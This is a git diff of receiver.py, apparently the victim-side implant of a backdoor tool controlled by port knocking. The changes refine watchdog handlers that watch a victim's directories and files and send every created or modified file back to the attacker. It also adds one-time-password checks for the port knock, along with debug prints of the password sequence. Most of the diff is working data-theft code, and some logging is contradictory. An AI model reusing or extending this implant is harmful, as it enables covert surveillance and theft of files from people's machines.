@@ -14,6 +14,7 @@ receiver.py
       save the output. Then start a TCP connection to the sender and return the payload.
 ----------------------------------------------------------------------------------------------------
 """
+import os.path
 
 import setproctitle
 import socket as sock
@@ -249,17 +250,21 @@ def process_sniff_pkt(pkt):
     if config.port_knock_password_base not in packet_password:
         print(f"Incorrect password base. Port knock rejected.")
 
-    pass_seq = packet_password.split(config.port_knock_password_base)
-
+    pass_seq = packet_password.split(config.port_knock_password_base)[1]
+    print(config.port_knock_password_seq_num)
+    print(packet_password)
     if int(pass_seq) >= int(config.port_knock_password_seq_num):
         print(f"Valid one-time password. Port knock accepted.")
+        config.port_knock_password_seq_num = str(int(pass_seq))
+        config.update_port_knock_password_seq_num()
     else:
         print(f"Invalid one-time password. Port knock rejected.")
-
-    if one_time_password != packet_password:
-        print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
         return
-    print(f"Password Matched!\n{one_time_password}\n{packet_password}")
+
+    # if one_time_password != packet_password:
+    #     print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
+    #     return
+    # print(f"Password Matched!\n{one_time_password}\n{packet_password}")
 
     if order == "1/1":
         instruction = commands[2]
@@ -418,56 +423,65 @@ def send_message(message, instruction, filename=""):
 
 
 
-# def on_created(event):
-#     print("created")
-#
-# def on_modified(event):
-#     print("modified")
-#     print(event)
+def on_created(event):
+    print("created")
+
+def on_modified(event):
+    print(event.src_path)
+    print(event)
+    if event.is_directory:
+        return None
 
 class OnMyWatch:
-    def __init__(self, directory_path, is_recursive=True, instruction='7'):
+    def __init__(self, directory_path, is_recursive=True):
+        self.threads = []
         self.observer = Observer()
         # Set the directory on watch
         self.watch_directory = directory_path
         self.is_recursive = is_recursive
-        self.instruction = instruction
+        # self.instruction = instruction
 
     def set_path(self, new_path):
         self.watch_directory = new_path
 
-    def run(self):
+    def run(self, instruction, new_path):
         # event_handler = Handler()
-        if self.instruction == '7':
+        if instruction == '7':
             event_handler = Handler()
         else:
             event_handler = Handler_File()
         # event_handler = FileSystemEventHandler()
         # event_handler.on_modified = on_modified
         # event_handler.on_created = on_created
-        self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
-        self.observer.start()
-        if self.instruction == "7":
-            try:
-                while directory_watch_active:
-                    time.sleep(1)
-            except:
-                self.observer.stop()
-                print("Observer Stopped")
-            self.observer.stop()
-        else:
-            try:
-                while file_watch_active:
-                    time.sleep(1)
-            except:
-                self.observer.stop()
-                print("Observer Stopped")
-            self.observer.stop()
-
-        # self.observer.join()
+        # self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
+        # self.observer.daemon=True
+        # t = self.observer.start()
+        observer = Observer()
+        observer.schedule(event_handler, new_path, recursive=True)
+        observer.daemon = True
+        observer.start()
+        self.threads.append(observer)
+        # if self.instruction == "7":
+        #     try:
+        #         while directory_watch_active:
+        #             time.sleep(1)
+        #     except:
+        #         # self.observer.kill()
+        #         print("Observer Stopped")
+        #     # self.observer.stop()
+        # else:
+        #     try:
+        #         while file_watch_active:
+        #             time.sleep(1)
+        #     except:
+        #         # self.observer.kill()
+        #         print("Observer Stopped")
+        #     # self.observer.stop()
 
     def stop(self):
-        self.observer.stop()
+        # self.observer.kill()
+        for x in self.threads:
+            x.stop()
 
 
 class Handler(FileSystemEventHandler):
@@ -480,34 +494,49 @@ class Handler(FileSystemEventHandler):
         elif event.event_type == 'created':
             # Event is created, you can process it now
             print("Watchdog received created event - % s." % event.src_path)
-            print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "7", file_name)
-            # "7" to match the watch a directory instruction sent by attacker
+            if event.src_path.endswith(".kate-swp"):
+                return
+            elif event.src_path.endswith(".part"):
+                new_path = event.src_path.split(".part")[0]
+                if os.path.exists(new_path):
+                    binary_file, file_name = get_file_binary(new_path)
+                    send_message(binary_file, "7", file_name)
+            elif os.path.exists(event.src_path):
+                binary_file, file_name = get_file_binary(event.src_path)
+                send_message(binary_file, "7", file_name)
+                print("Skipped invalid file path")
         elif event.event_type == 'modified':
             # Event is modified, you can process it now
             print("Watchdog received modified event - % s." % event.src_path)
-            print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "7", file_name)
-            # "7" to match the watch a directory instruction sent by attacker
+            if event.src_path.endswith(".kate-swp"):
+                return
+            elif event.src_path.endswith(".part"):
+                new_path = event.src_path.split(".part")[0]
+                if os.path.exists(new_path):
+                    binary_file, file_name = get_file_binary(new_path)
+                    send_message(binary_file, "7", file_name)
+            elif os.path.exists(event.src_path):
+                binary_file, file_name = get_file_binary(event.src_path)
+                send_message(binary_file, "7", file_name)
+                print("Skipped invalid file path")
 
 
 directory_watch_active = False
-watch = OnMyWatch("/root/Desktop", instruction="7")
+watch = OnMyWatch("/root/Desktop")
 
 
 def start_watching_directory(directory_path):
     global watch
     global directory_watch_active
     if directory_watch_active:
-        print(f"Already watching directory {watch.watch_directory}")
+        print(f"Already watching directory.")
         return
-
+#   import threading
+#     t1 = threading.Thread()
     directory_watch_active = True
     watch.set_path(directory_path)
 
-    watch.run()
+    watch.run("7", directory_path)
     print(f"Directory watch started: {directory_path}")
 
 
@@ -535,21 +564,35 @@ class Handler_File(FileSystemEventHandler):
         elif event.event_type == 'created':
             # Event is created, you can process it now
             print("Watchdog received created event - % s." % event.src_path)
-            print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "5", file_name)
-            # "7" to match the watch a directory instruction sent by attacker
+            if event.src_path.endswith(".kate-swp"):
+                return
+            elif event.src_path.endswith(".part"):
+                new_path = event.src_path.split(".part")[0]
+                if os.path.exists(new_path):
+                    binary_file, file_name = get_file_binary(new_path)
+                    send_message(binary_file, "5", file_name)
+            elif os.path.exists(event.src_path):
+                binary_file, file_name = get_file_binary(event.src_path)
+                send_message(binary_file, "5", file_name)
+                print("Skipped invalid file path")
         elif event.event_type == 'modified':
             # Event is modified, you can process it now
             print("Watchdog received modified event - % s." % event.src_path)
-            print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "5", file_name)
-            # "7" to match the watch a directory instruction sent by attacker
+            if event.src_path.endswith(".kate-swp"):
+                return
+            elif event.src_path.endswith(".part"):
+                new_path = event.src_path.split(".part")[0]
+                if os.path.exists(new_path):
+                    binary_file, file_name = get_file_binary(new_path)
+                    send_message(binary_file, "5", file_name)
+            elif os.path.exists(event.src_path):
+                binary_file, file_name = get_file_binary(event.src_path)
+                send_message(binary_file, "5", file_name)
+                print("Skipped invalid file path")
 
 
 file_watch_active = False
-watch_file = OnMyWatch("/root/Desktop", instruction="5")
+watch_file = OnMyWatch("/root/Desktop")
 
 
 def start_watching_file(file_path):
@@ -561,13 +604,18 @@ def start_watching_file(file_path):
 
     file_watch_active = True
     watch_file.set_path(file_path)
-
-    watch_file.run()
+    # import threading
+    # t1 = threading.Thread(target=watch_file.run, args=())
+    # t1.start()
+    # t1.join()
+    # watch_file.run()
+    watch.run("5", file_path)
     print(f"File watch started: {file_path}")
 
 
 def stop_watching_file():
-    global watch_file
+    global watch
+    # global watch_file
     global file_watch_active
 
     if not file_watch_active:
@@ -575,8 +623,9 @@ def stop_watching_file():
         return
 
     file_watch_active = False
-    watch_file.stop()
-    print(f"File watch stopped: {watch_file.watch_directory}")
+    # watch_file.stop()
+    watch.stop()
+    print(f"File watch stopped: {watch.watch_directory}")
     return
 
 
